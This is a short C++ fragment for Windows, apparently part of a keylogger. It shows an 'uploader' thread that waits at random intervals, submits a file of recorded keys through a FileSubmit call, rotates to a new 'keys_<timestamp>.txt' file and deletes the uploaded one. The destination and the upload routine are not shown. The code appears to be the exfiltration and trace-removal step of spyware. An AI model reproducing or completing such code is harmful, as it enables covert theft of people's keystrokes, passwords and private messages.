...
void uploader(void* parg){
	...
	unsigned int t_sleep = rand() % 1000 + 100; // For debugging we do 1 to 10 seconds.
	time_t t_stamp = time(0);
	WaitForSingleObject( hIOMutex, INFINITE);
	
	/* Upload the file */
	std::wstring stemp = s2ws(fname);
	FileSubmit( (LPCWSTR*)stemp.c_str(), (LPCWSTR*)stemp.c_str() );
	
	/* Create a new file name */
	std::string nfname = ".\\keys_" + std::to_string(t_stamp) + ".txt";

	/* Delete the old file */
	int ret = DeleteFile((LPCTSTR)fname.c_str());
	if(ret == 0){
		std::cout << "Error deleting file: " << GetLastError() << std::endl;
	}
